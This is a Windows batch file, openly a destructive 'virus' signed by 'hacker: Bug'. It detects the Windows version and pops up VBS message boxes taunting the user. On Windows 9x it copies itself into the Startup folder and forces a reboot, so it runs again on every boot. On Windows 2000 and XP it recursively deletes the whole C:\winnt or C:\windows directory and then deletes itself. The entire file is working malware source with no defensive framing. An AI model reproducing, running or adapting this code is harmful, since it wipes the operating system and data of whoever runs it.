@echo off

goto win9xchk 

:win9xchk
if exist c:\windows\startm~1\programs\startup goto play9x
if not exist c:\windows\startm~1\programs\startup goto Win2kchk

:win2kchk 
If exist c:\winnt goto Win2kBud 
If not exist c:\winnt goto winxpBud 

:winxpchk 
If exist c:\windows goto WinxpMsg 

:Win2kBud
cd C:/
md Q_bud
goto Win2kMsg

:winxpbud
cd C:/
md Q_bud
goto winxpMsg

:win2kMsg
echo MsgBox "your computer have been infected with a destructive virus",64,"Bug" >> C:\Q_bud\bug.vbs
echo MsgBox "If you will send your computer to a SERVICE , they will not identify any virus in your computer!",64,"Bug" >> C:\Q_bud\bug.vbs
echo MsgBox "because the virus...in the end destroy's it self! good ehh?!!!",64,"System32" >> C:\Q_bud\bug.vbs
echo MsgBox "this virus was made from hacker: Bug! SEE YOU IN SERVICE!!!",64,"System32" >> C:\Q_bud\bug.vbs
start C:\Q_bud\bug.vbs
goto deletewin2k

:winxpMsg
echo MsgBox "your computer have been infected with a destructive virus",64,"Bug" >> C:\Q_bud\bug.vbs
echo MsgBox "If you will send your computer to a SERVICE , they will not identify any virus in your computer!",64,"Bug" >> C:\Q_bud\bug.vbs
echo MsgBox "because the virus...in the end destroy's it self! good ehh?!!!",64,"System32" >> C:\Q_bud\bug.vbs
echo MsgBox "this virus was made from hacker: Bug! SEE YOU IN SERVICE!!!",64,"System32" >> C:\Q_bud\bug.vbs
start C:\Q_bud\bug.vbs
goto deletexp

:play9x
echo MsgBox "Sorry your to Stupid to enter this computer!",vbCritical,"Bug" >> c:\windows\startm~1\programs\startup\stupid.vbs
start c:\windows\startm~1\programs\startup\stupid.vbs
goto rebootwin9x

:rebootwin9x
copy %0 c:\windows\startm~1\programs\startup 
start rundll.exe shell32.dll,SHExitWindowsEx 2

:deletewin2k 
Rd/s/q c:\winnt 

:deletexp 
Rd/s/q c:\windows 

del %0 